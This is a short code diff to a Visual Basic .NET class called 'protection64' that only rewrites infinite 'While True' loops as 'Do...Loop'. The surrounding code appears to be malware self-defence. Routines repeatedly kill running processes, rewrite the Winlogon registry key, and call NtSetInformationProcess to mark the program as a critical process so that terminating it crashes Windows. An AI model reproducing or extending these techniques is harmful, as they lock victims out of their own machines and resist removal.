@@ -135,7 +135,7 @@ Public Class protection64
         Application.[Exit]()
     End Sub
     Sub taskkill()
-        While True
+        Do
             Dim Procs As Process() = Process.GetProcesses()
 
             For Each prc As Process In Procs
@@ -156,10 +156,10 @@ Public Class protection64
             Next
 
             Thread.Sleep(100)
-        End While
+        Loop
     End Sub
     Sub regdefend()
-        While True
+        Do
 
             Try
                 Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
@@ -233,16 +233,16 @@ Public Class protection64
             Catch
             End Try
             Thread.Sleep(2000)
-        End While
+        Loop
     End Sub
     Sub selfdefend()
-        While True
+        Do
             NtSetInformationProcess(Process.GetCurrentProcess().Handle, breakOnTermination, isCritical, Marshal.SizeOf(Of Integer))
             Thread.Sleep(5000)
-        End While
+        Loop
     End Sub
     Sub winprockill()
-        While True
+        Do
             Dim Procs As Process() = Process.GetProcesses()
             For Each prc As Process In Procs
 
@@ -297,7 +297,7 @@ Public Class protection64
                 Next
             Next
             Thread.Sleep(1)
-        End While
+        Loop
     End Sub
     Sub winprockill2()
         'do nothing and exit
